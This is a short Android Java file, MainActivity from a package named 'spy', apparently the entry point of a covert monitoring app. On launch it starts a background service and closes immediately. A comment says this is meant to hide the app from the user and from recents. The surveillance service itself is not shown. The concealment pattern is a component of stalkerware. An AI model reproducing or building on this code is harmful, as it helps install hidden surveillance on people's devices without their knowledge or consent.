package com.gauravhanna.spy;

import android.content.Intent;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Start background service
        startService(new Intent(this, BackgroundService.class));
        // Hide app icon - remove from recents and finish
        finish();
    }
}